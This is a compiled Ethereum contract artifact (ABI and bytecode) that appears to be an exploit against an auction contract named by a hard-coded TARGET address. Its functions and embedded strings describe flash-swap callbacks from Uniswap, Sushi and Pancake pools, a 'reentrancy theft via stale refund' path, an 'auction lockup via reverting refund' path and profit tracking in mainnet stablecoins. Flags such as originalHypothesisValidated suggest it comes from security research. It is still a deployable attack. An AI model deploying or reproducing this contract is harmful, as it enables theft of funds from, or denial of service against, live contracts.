{"abi":[{"type":"constructor","inputs":[],"stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IGameAuction"}],"stateMutability":"view"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"exploitPathUsed","inputs":[],"outputs":[{"name":"","type":"string","internalType":"string"}],"stateMutability":"view"},{"type":"function","name":"lockupPathExecuted","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"originalHypothesisRefuted","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"originalHypothesisValidated","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"pancakeCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"profitAchieved","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"reentrancyPathExecuted","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"reentrancyPathProfitable","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"sushiCall","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60e0604081905261046e808201906001600160401b0382118383101761015357829161004d91611e2784397352d69c67536f55efefe02941868e5e762538dbd6815230602082015260400190565b03905ff0801561014857608052604051610271808201906001600160401b038211838310176101535782916100a49161229584397352d69c67536f55efefe02941868e5e762538dbd6815230602082015260400190565b03905ff080156101485760a05260405161044d808201906001600160401b038211838310176101535782916100fb9161250684397352d69c67536f55efefe02941868e5e762538dbd6815230602082015260400190565b03905ff080156101485760c0525f80546001600160a01b0319169055604051611cbf9081610168823960805181611231015260a05181610e33015260c051818181610e9301526112d70152f35b6040513d5f823e3d90fd5b634e487b7160e01b5f52604160045260245ffdfe6080604052600436101561001a575b3615610018575f80fd5b005b5f3560e01c8062991403146102f657806310d1e85c146102515780632d0455b5146102d25780633c2448ed146102bf57806349343624146102985780635ff972cc1461027b57806373e3b75b1461025657806384800812146102515780639159ade21461022f5780639359d6cd1461020a578063cc1f2afa146101e3578063d723a322146101be578063d78c4281146100e05763f0a011760361000e57346100dc575f3660031901126100dc57602060ff60025460101c166040519015158152f35b5f80fd5b346100dc575f3660031901126100dc57604051600354905f610101836106a1565b8083526020830193600181169081156101a35750600114610158575b509061012d816040930382610725565b8151928391602083525180918160208501528484015e5f828201840152601f01601f19168101030190f35b91905060035f525f516020611c4a5f395f51905f52915f905b8082106101895750909150810160200161012d61011d565b919260018160209254838588010152019101909291610171565b60ff1916855250151560051b8201602001905061012d61011d565b346100dc575f3660031901126100dc57602060ff60025460281c166040519015158152f35b346100dc575f3660031901126100dc5760206040515f516020611c6a5f395f51905f528152f35b346100dc575f3660031901126100dc57602060ff60025460181c166040519015158152f35b346100dc575f3660031901126100dc57602060ff600254166040519015158152f35b6102f6565b346100dc575f3660031901126100dc57602060ff60025460081c166040519015158152f35b346100dc575f3660031901126100dc576020600154604051908152f35b346100dc575f3660031901126100dc575f546040516001600160a01b039091168152602090f35b5f3660031901126100dc57610018610782565b346100dc575f3660031901126100dc57602060ff600254821c166040519015158152f35b346100dc5760803660031901126100dc576004356001600160a01b038116908181036100dc575060243560443560643567ffffffffffffffff81116100dc57366023820112156100dc5780600401359067ffffffffffffffff82116100dc5736602483830101116100dc5750506004545f93906001600160a01b0316330361067157300361063f5781156106375750905b604051610393816106d9565b60065481526007549260208201938452600854906040830191825260095460608401908152600a54916080850192835260a0600b549501948086528103610607576005546001600160a01b031690813b156100dc575f91602483926040519485938492632e1a7d4d60e01b845260048401525af180156105fc576105e4575b5061042693949551925190519151926111dd565b156105a65761043f905161043981611c03565b90610775565b80471061056c5760055482906001600160a01b0316803b1561054057818391600460405180948193630d0e30db60e41b83525af1801561054c57610557575b5050602060018060a01b036005541691604460018060a01b036004541685604051958694859363a9059cbb60e01b8552600485015260248401525af190811561054c57829161050e575b50156104d15780f35b60405162461bcd60e51b81526020600482015260156024820152741c995c185e481d1c985b9cd9995c8819985a5b1959605a1b6044820152606490fd5b90506020813d602011610544575b8161052960209383610725565b810103126105405761053a90610768565b5f6104c8565b5080fd5b3d915061051c565b6040513d84823e3d90fd5b8161056191610725565b61054057815f61047e565b60405162461bcd60e51b8152602060048201526012602482015271696e73756666696369656e7420726570617960701b6044820152606490fd5b60405162461bcd60e51b81526020600482015260166024820152751c99595b9d1c985b98de481c185d1a0819985a5b195960521b6044820152606490fd5b6104269495505f6105f491610725565b5f9493610412565b6040513d5f823e3d90fd5b60405162461bcd60e51b81526020600482015260086024820152673130b2103637b0b760c11b6044820152606490fd5b905090610387565b60405162461bcd60e51b815260206004820152600a6024820152693130b21039b2b73232b960b11b6044820152606490fd5b60405162461bcd60e51b81526020600482015260086024820152673130b2103830b4b960c11b6044820152606490fd5b90600182811c921680156106cf575b60208310146106bb57565b634e487b7160e01b5f52602260045260245ffd5b91607f16916106b0565b60c0810190811067ffffffffffffffff8211176106f557604052565b634e487b7160e01b5f52604160045260245ffd5b60e0810190811067ffffffffffffffff8211176106f557604052565b90601f8019910116810190811067ffffffffffffffff8211176106f557604052565b9190820391821161075457565b634e487b7160e01b5f52601160045260245ffd5b519081151582036100dc57565b9190820180921161075457565b61078c3447610747565b6040516318916f9b60e01b81526020816004815f516020611c6a5f395f51905f525afa9081156105fc575f91610a1d575b50610a0b576040516397d54cf760e01b8152476020826004815f516020611c6a5f395f51905f525afa9182156105fc575f926109d7575b506001820180921161075457106109c95761080e81610d0d565b60ff60025460281c16156108f1575b508047115f146108e75747036001556201000062ff0000196002541617600255600354610849816106a1565b15610882575b505b60025460ff8160101c161580610877575b6108695750565b61ff00191661010017600255565b5060ff811615610862565b61088b906106a1565b601f81116108b2575b50601a6c191a5c9958dd081c1c9bd99a5d609a1b016003555f61084f565b60035f52601f0160051c5f516020611c4a5f395f51905f52908101905b8181106108dc5750610894565b5f81556001016108cf565b505f600155610851565b8147115f146109c2576109048247610747565b905b15908115610929575b5061091b575b5f61081d565b610923610d8d565b50610915565b6040516397d54cf760e01b81529091506020816004815f516020611c6a5f395f51905f525afa9081156105fc575f91610990575b508060011b90808204600214901517156107545766038d7ea4c6800001908166038d7ea4c680001161075457115f61090f565b90506020813d6020116109ba575b816109ab60209383610725565b810103126100dc57515f61095d565b3d915061099e565b5f90610906565b6109d281610afe565b61080e565b9091506020813d602011610a03575b816109f360209383610725565b810103126100dc5751905f6107f4565b3d91506109e6565b5061010061ff00196002541617600255565b90506020813d602011610a4f575b81610a3860209383610725565b810103126100dc57610a4990610768565b5f6107bd565b3d9150610a2b565b67ffffffffffffffff81116106f557601f01601f191660200190565b3d15610a9d573d90610a8482610a57565b91610a926040519384610725565b82523d5f602084013e565b606090565b601f8111610aad5750565b60035f52601f0160051c5f516020611c4a5f395f51905f52017fc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85d5b818110610af3575050565b5f8155600101610ae8565b610b066115d8565b60c081015115610d07576080810190610b1f8251611876565b919390916001600160a01b038416918215610cfb575f96879687946001600160601b0360a01b600454161760045560018060a01b03166001600160601b0360a01b60055416176005558151916020810151606060408301519201519251938460a08d60405190610b8e826106d9565b815283602082015284604082015285606082015286608082015201528b600655600755600855600955600a55600b5560405190602082019363022c0d9f60e01b85526024830152604482015230606482015260806084820152600160a4820152600160f81b60c482015260c48152610c0760e482610725565b51925af190610c14610a73565b505f6006555f6007555f6008555f6009555f600a555f600b556001600160601b0360a01b600454166004556001600160601b0360a01b6005541660055581610cf1575b50610c60575f90565b64010000000064ff00000000196002541617600255600354610c81816106a1565b15610c8d575b50600190565b610c99610c9e916106a1565b610aa2565b604360035560035f527f7265656e7472616e637920746865667420766961207374616c6520726566756e5f516020611c4a5f395f51905f5255601960fa1b5f516020611c2a5f395f51905f52555f610c87565b905047115f610c57565b50505050505050505f90565b50505f90565b610d156115d8565b60c0810151158015610d56575b610d075780610d42915190602081015160606040830151920151926111dd565b15610d51574711610c60575f90565b505f90565b5047610d688251604084015190610775565b11610d22565b908160209103126100dc57516001600160a01b03811681036100dc5790565b6040516397d54cf760e01b81525f906020816004815f516020611c6a5f395f51905f525afa9081156105fc575f916111ab575b506001810180911161075457804710610d07576040516302f57fbf60e41b81526020816004815f516020611c6a5f395f51905f525afa9081156105fc575f9161118c575b505f80604051602081019063454a2ab360e01b825285602482015260248152610e2e604482610725565b5190857f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03165af1610e65610a73565b50156110905750610e7590611bde565b804710610d075760405163687866b360e01b815260048101829052907f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316905f9083906024908290855af19182156105fc575f9261100a575b50803b156100dc575f8091600460405180948193631afd520b60e11b83525af180156105fc57610ff5575b5015610f0a5790565b6501000000000165ff00000000ff196002541617600255600354610f2d816106a1565b15610f3a575b5050600190565b610f43906106a1565b601f8111610fa2575b5060039060478255527f61756374696f6e206c6f636b75702076696120726576657274696e67207265665f516020611c4a5f395f51905f5255621d5b9960ea1b5f516020611c2a5f395f51905f52555f80610f33565b60038252601f0160051c5f516020611c4a5f395f51905f52017fc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85d5b818110610fea5750610f4c565b828155600101610fdd565b6110029192505f90610725565b5f905f610f01565b9091503d805f833e61101c8183610725565b81016040828203126100dc5761103182610768565b9160208101519067ffffffffffffffff82116100dc570181601f820112156100dc57805161105e81610a57565b9261106c6040519485610725565b818452602082840101116100dc575f928160208094018483015e010152905f610ed6565b6040516302f57fbf60e41b8152925090506020826004815f516020611c6a5f395f51905f525afa9182156105fc575f9261115b575b506001600160a01b039182169116146110dc575f90565b6501000000000165ff00000000ff196002541617600255611101610c996003546106a1565b605360035560035f527f6578697374696e6720696e63756d62656e7420616c726561647920626c6f636b5f516020611c4a5f395f51905f5255687320726566756e647360b81b5f516020611c2a5f395f51905f5255600190565b61117e91925060203d602011611185575b6111768183610725565b810190610d6e565b905f6110c5565b503d61116c565b6111a5915060203d602011611185576111768183610725565b5f610e04565b90506020813d6020116111d5575b816111c660209383610725565b810103126100dc57515f610dc0565b3d91506111b9565b91905f936040516302f57fbf60e41b81526020816004815f516020611c6a5f395f51905f525afa9081156105fc575f916115b9575b5060405163454a2ab360e01b60208201908152602480830188905282527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316965f9283929061126a604482610725565b5191895af1611277610a73565b50156114cb5750833b156100dc576040519163ec886ff360e01b835260048301526024820152600160448201525f8160648183875af180156105fc576114b6575b5060405163454a2ab360e01b60208201908152602480830184905282527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316928592839290611310604482610725565b5191855af19161131e610a73565b50803b156114925760405163ec886ff360e01b8152846004820152846024820152846044820152848160648183865af180156114ab57908591611496575b5050803b1561149257838091600460405180948193631afd520b60e11b83525af1801561148757908491611472575b5050803b1561146e57828091600460405180948193631afd520b60e11b83525af180156114635790839161144e575b50501561144b57630100000163ff0000ff196002541617600255600354906113e1826106a1565b156113ed575050600190565b6113fb610c996003936106a1565b60438255527f7265656e7472616e637920746865667420766961207374616c6520726566756e5f516020611c4a5f395f51905f5255601960fa1b5f516020611c2a5f395f51905f52555f80610f33565b90565b8161145891610725565b61054057815f6113ba565b6040513d85823e3d90fd5b8280fd5b8161147c91610725565b61146e57825f61138b565b6040513d86823e3d90fd5b8380fd5b816114a091610725565b61149257835f61135c565b6040513d87823e3d90fd5b6114c39193505f90610725565b5f915f6112b8565b945050505050604051906302f57fbf60e41b82526020826004815f516020611c6a5f395f51905f525afa9182156105fc575f92611598575b506001600160a01b0391821691161461151a575f90565b6501000000000165ff00000000ff19600254161760025561153f610c996003546106a1565b605360035560035f527f6578697374696e6720696e63756d62656e7420616c726561647920626c6f636b5f516020611c4a5f395f51905f5255687320726566756e647360b81b5f516020611c2a5f395f51905f52555f90565b6115b291925060203d602011611185576111768183610725565b905f611503565b6115d2915060203d602011611185576111768183610725565b5f611212565b604051906115e582610709565b5f82525f60208301525f60408301525f60608301525f60808301525f60a08301525f60c08301528160405163c01a974560e01b81526020816004815f516020611c6a5f395f51905f525afa9081156105fc575f9161180b575b506040516397d54cf760e01b8152906020826004815f516020611c6a5f395f51905f525afa9182156105fc575f926117d7575b50600182018092116107545761168682611bde565b925f516020611c6a5f395f51905f5231908484118015906117cd575b6117c55750906116b191610747565b916116bc8183610747565b60015b60408111156116cf575050505050565b8181028181048314821517156107545783906116eb8588610775565b81116117b3575b6116fc8287610775565b9082808211156117ab5761170f91610747565b61171882611c03565b9066038d7ea4c68000820180831161075457811180611795575b61174b575b505050505f198114610754576001016116bf565b6117589293949a50610747565b906040519261176684610709565b8684528560208501526040840152886060840152608083015260a0820152600160c0820152955f808080611737565b506117a08282610747565b60a08c015110611732565b50505f61170f565b90506117bf8682610747565b906116f2565b955050505050565b50828211156116a2565b9091506020813d602011611803575b816117f360209383610725565b810103126100dc5751905f611671565b3d91506117e6565b90506020813d602011611835575b8161182660209383610725565b810103126100dc57515f61163e565b3d9150611819565b90600681101561184e5760051b0190565b634e487b7160e01b5f52603260045260245ffd5b51906001600160701b03821682036100dc57565b5f915f905f90604051611888816106d9565b735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f8152735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f6020820152735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f604082015273c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac606082015273c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac608082015273c0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac60a08201526040519461192e866106d9565b73a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48865273dac17f958d2ee523a2206206994597c13d831ec76020870152736b175474e89094c44da98b954eedeac495271d0f604087015273a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48606087015273dac17f958d2ee523a2206206994597c13d831ec76080870152736b175474e89094c44da98b954eedeac495271d0f60a087015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2955f905b600682106119ee5750505050565b60018060a09a939496979895999a1b03611a08848a61183d565b5116976001600160a01b03611a1d858461183d565b51169360208b6044604051809d819363e6a4390560e01b835260018060a01b0316998a600484015260248301525afa998a156105fc575f9a611bbe575b506001600160a01b038a16948515611ba957604051630240bc6b60e21b8152906060826004818a5afa9687156105fc575f925f98611b4c575b509060206004939260405194858092630dfe168160e01b82525afa80156105fc576001600160701b03935f91611b2e575b506001600160a01b031614968715611b265750165b611aeb611ae589611c03565b89610775565b1015611b0d57505050505f14611b045750925b93929190565b93925091611afe565b9092999850600191935096959493965b019092916119e0565b905016611ad9565b611b46915060203d8111611185576111768183610725565b5f611ac4565b91925096506060813d8211611ba1575b81611b6960609383610725565b810103126100dc57611b7a81611862565b916040611b8960208401611862565b92015163ffffffff8116036100dc5790966020611a93565b3d9150611b5c565b50909299985060019193509695949396611b1d565b611bd7919a5060203d8111611185576111768183610725565b985f611a5a565b6005810290808204600514901517156107545760649004600181018091116107545790565b600381029080820460031490151715610754576103e5900460018101809111610754579056fec2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85cc2575a0e9e593c00f959f8c92f12db2869c3395a3b0502d05e2516446f71f85b00000000000000000000000052d69c67536f55efefe02941868e5e762538dbd6a2646970667358221220c378b876e26d1914e27024631c9e051f6649c7a3f94c3d6aa1a47a10804836ea64736f6c634300081e003360c0601f61046e38819003918201601f19168301916001600160401b0383118484101761009f57808492604094855283398101031261009b578051906001600160a01b038216820361009b5760200151906001600160a01b038216820361009b5760805260a0526040516103ba90816100b48239608051818181601a01526101bc015260a0518181816101200152818161018501526102630152f35b5f80fd5b634e487b7160e01b5f52604160045260245ffdfe608060405260043610156100d0575b3615610018575f80fd5b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316338114806100c4575b806100b9575b806100ae575b61005d57005b6001545f19016001555f5490803b156100aa575f90600460405180948193631e61c6cb60e31b83525af1801561009f5761009357005b5f61009d91610362565b005b6040513d5f823e3d90fd5b5f80fd5b50475f541115610057565b506001541515610051565b5060ff6002541661004b565b5f5f3560e01c806335faa4161461024d578063454a2ab31461016f5763ec886ff3146100fc575061000e565b3461016c57606036600319011261016c5760443580151580910361016a5761014e337f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031614610326565b600435825560243560015560ff80196002541691161760025580f35b505b80fd5b5060203660031901126100aa576004356101b3337f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031614610326565b80340361021c577f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316803b156100aa575f90600460405180948193631e61c6cb60e31b83525af1801561009f57610210575080f35b61009d91505f90610362565b60405162461bcd60e51b81526020600482015260096024820152686261642076616c756560b81b6044820152606490fd5b346100aa575f3660031901126100aa575f8080807f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316610296338214610326565b47905af13d15610321573d67ffffffffffffffff811161030d57604051906102c8601f8201601f191660200183610362565b81525f60203d92013e5b156102d957005b60405162461bcd60e51b815260206004820152600c60248201526b1cddd9595c0819985a5b195960a21b6044820152606490fd5b634e487b7160e01b5f52604160045260245ffd5b6102d2565b1561032d57565b60405162461bcd60e51b815260206004820152600d60248201526c37b7363c903b32b934b334b2b960991b6044820152606490fd5b90601f8019910116810190811067ffffffffffffffff82111761030d5760405256fea26469706673582212201d00741744374172aee89b236b560743238d1f93cd171d18e6ddc3b284835cbf64736f6c634300081e003360c0601f61027138819003918201601f19168301916001600160401b0383118484101760855780849260409485528339810103126081578051906001600160a01b038216820360815760200151906001600160a01b038216820360815760805260a0526040516101d7908161009a82396080518160b1015260a0518160790152f35b5f80fd5b634e487b7160e01b5f52604160045260245ffdfe6080806040526004361015610050575b50361561001a575f80fd5b60405162461bcd60e51b815260206004820152600e60248201526d1c99599d5b9908189b1bd8dad95960921b6044820152606490fd5b5f905f3560e01c63454a2ab314610067575061000f565b602036600319011261013a57600435907f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316330361016f575080340361013e577f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316803b1561013a575f90600460405180948193631e61c6cb60e31b83525af1801561012f57610105575080f35b905067ffffffffffffffff811161011b57604052005b634e487b7160e01b5f52604160045260245ffd5b6040513d5f823e3d90fd5b5f80fd5b60405162461bcd60e51b81526020600482015260096024820152686261642076616c756560b81b6044820152606490fd5b62461bcd60e51b815260206004820152600d60248201526c37b7363c903b32b934b334b2b960991b6044820152606490fdfea2646970667358221220a4facadbc9fd63ae82832cfaa95177f9092393946a732a9e23d6e3b8d61ffb0464736f6c634300081e003360c0601f61044d38819003918201601f19168301916001600160401b0383118484101761009e57808492604094855283398101031261009a578051906001600160a01b038216820361009a5760200151906001600160a01b038216820361009a5760805260a05260405161039a90816100b3823960805181818160be015261017b015260a051818181605f0152818161014001526102000152f35b5f80fd5b634e487b7160e01b5f52604160045260245ffdfe6080604052600436101561001a575b3615610018575f80fd5b005b5f5f3560e01c806335faa416146101ea578063454a2ab31461012a5763687866b314610046575061000e565b6020366003190112610127576060818060043561008d337f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03161461027b565b61009881341461032c565b604051631e61c6cb60e31b6020820190815260048252906100ba6024826102b7565b51917f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03165af160206100f26102ed565b93604051948593151584526040838501528051928391826040870152018585015e828201840152601f01601f19168101030190f35b80fd5b5060203660031901126101e65760043561016e337f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03161461027b565b61017981341461032c565b7f00000000000000000000000000000000000000000000000000000000000000006001600160a01b0316803b156101e6575f90600460405180948193631e61c6cb60e31b83525af180156101db576101cf575080f35b61001891505f906102b7565b6040513d5f823e3d90fd5b5f80fd5b346101e6575f3660031901126101e6575f8080807f00000000000000000000000000000000000000000000000000000000000000006001600160a01b031661023333821461027b565b47905af161023f6102ed565b501561024757005b60405162461bcd60e51b815260206004820152600c60248201526b1cddd9595c0819985a5b195960a21b6044820152606490fd5b1561028257565b60405162461bcd60e51b815260206004820152600d60248201526c37b7363c903b32b934b334b2b960991b6044820152606490fd5b90601f8019910116810190811067ffffffffffffffff8211176102d957604052565b634e487b7160e01b5f52604160045260245ffd5b3d15610327573d9067ffffffffffffffff82116102d9576040519161031c601f8201601f1916602001846102b7565b82523d5f602084013e565b606090565b1561033357565b60405162461bcd60e51b81526020600482015260096024820152686261642076616c756560b81b6044820152606490fdfea26469706673582212209b6c760ef156c46c09dcff7ad0997a3848c26f57b6959336202a9d78ec926cca64736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"TARGET()":"cc1f2afa","executeOnOpportunity()":"3c2448ed","exploitPathUsed()":"d78c4281","lockupPathExecuted()":"d723a322","originalHypothesisRefuted()":"73e3b75b","originalHypothesisValidated()":"9159ade2","pancakeCall(address,uint256,uint256,bytes)":"84800812","profitAchieved()":"f0a01176","profitAmount()":"5ff972cc","profitToken()":"49343624","reentrancyPathExecuted()":"9359d6cd","reentrancyPathProfitable()":"2d0455b5","sushiCall(address,uint256,uint256,bytes)":"00991403","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c"},"id":0}